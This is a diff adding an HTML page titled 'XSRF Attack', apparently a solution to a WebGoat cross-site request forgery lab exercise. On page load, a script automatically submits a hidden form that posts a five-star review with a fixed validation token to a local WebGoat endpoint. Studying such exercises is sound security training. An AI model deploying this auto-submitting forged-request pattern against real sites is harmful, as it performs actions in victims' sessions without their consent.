@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <title>XSRF Attack</title>
+</head>
+<body>
+<form action="http://localhost:8080/WebGoat/csrf/review" method="post">
+    <input type="hidden" name="reviewText" value="Test">
+    <input type="hidden" name="reviewStars" value="5">
+    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+</form>
+
+<script>
+    console.log("Start Attack");
+    document.querySelector("form").submit()
+</script>
+    
+</body>
+</html>
